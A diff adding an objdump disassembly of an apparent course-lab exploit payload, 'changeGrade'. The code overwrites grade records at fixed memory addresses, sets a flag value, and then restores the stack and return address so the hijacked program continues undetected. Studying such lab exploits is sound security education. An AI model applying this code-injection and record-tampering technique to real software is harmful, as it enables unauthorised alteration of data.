@@ -1,0 +1,59 @@
+
+hack.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <changeGrade>:
+changeGrade():
+   0:	55                   	push   %rbp
+   1:	48 89 e5             	mov    %rsp,%rbp
+   4:	48 c7 c7 c0 2b 60 00 	mov    $0x602bc0,%rdi
+   b:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
+   f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
+  16:	eb 7f                	jmp    97 <changeGrade+0x97>
+  18:	83 7d fc 03          	cmpl   $0x3,-0x4(%rbp)
+  1c:	7e 06                	jle    24 <changeGrade+0x24>
+  1e:	83 7d fc 07          	cmpl   $0x7,-0x4(%rbp)
+  22:	7e 35                	jle    59 <changeGrade+0x59>
+  24:	8b 45 fc             	mov    -0x4(%rbp),%eax
+  27:	48 63 d0             	movslq %eax,%rdx
+  2a:	48 89 d0             	mov    %rdx,%rax
+  2d:	48 c1 e0 02          	shl    $0x2,%rax
+  31:	48 01 d0             	add    %rdx,%rax
+  34:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
+  3b:	00 
+  3c:	48 01 d0             	add    %rdx,%rax
+  3f:	48 c1 e0 04          	shl    $0x4,%rax
+  43:	48 89 c2             	mov    %rax,%rdx
+  46:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
+  4a:	48 01 d0             	add    %rdx,%rax
+  4d:	c7 80 90 00 00 00 64 	movl   $0x64,0x90(%rax)
+  54:	00 00 00 
+  57:	eb 3a                	jmp    93 <changeGrade+0x93>
+  59:	8b 45 fc             	mov    -0x4(%rbp),%eax
+  5c:	48 63 d0             	movslq %eax,%rdx
+  5f:	48 89 d0             	mov    %rdx,%rax
+  62:	48 c1 e0 02          	shl    $0x2,%rax
+  66:	48 01 d0             	add    %rdx,%rax
+  69:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
+  70:	00 
+  71:	48 01 d0             	add    %rdx,%rax
+  74:	48 c1 e0 04          	shl    $0x4,%rax
+  78:	48 89 c2             	mov    %rax,%rdx
+  7b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
+  7f:	48 01 d0             	add    %rdx,%rax
+  82:	c7 80 90 00 00 00 0b 	movl   $0xb,0x90(%rax)
+  89:	00 00 00 
+  8c:	83 a8 90 00 00 00 01 	subl   $0x1,0x90(%rax)
+  93:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
+  97:	83 7d fc 0b          	cmpl   $0xb,-0x4(%rbp)
+  9b:	0f 8c 77 ff ff ff    	jl     18 <changeGrade+0x18>
+  a1:	48 c7 c0 00 20 60 00 	mov    $0x602000,%rax
+  a8:	48 c7 00 42 00 00 00 	movq   $0x42,(%rax)
+  af:	48 89 e5             	mov    %rsp,%rbp
+  b2:	48 83 c5 38          	add    $0x38,%rbp
+  b6:	48 83 c4 08          	add    $0x8,%rsp
+  ba:	68 73 09 40 00       	pushq  $0x400973
+  bf:	48 83 ec 30          	sub    $0x30,%rsp
+  c3:	c3                   	retq   
